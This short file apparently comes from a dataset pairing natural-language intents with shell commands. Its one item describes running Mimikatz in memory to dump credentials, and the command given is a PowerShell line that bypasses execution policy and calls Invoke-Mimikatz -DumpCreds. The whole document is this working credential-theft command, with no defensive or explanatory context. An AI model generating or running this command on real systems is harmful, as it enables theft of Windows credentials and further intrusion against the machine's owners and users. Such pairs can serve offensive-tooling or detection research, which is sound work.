# Natural language intent:
# Execute Mimikatz in memory to dump credentials with bypassed execution policy.

powershell.exe -exec bypass -c "Invoke-Mimikatz -DumpCreds"
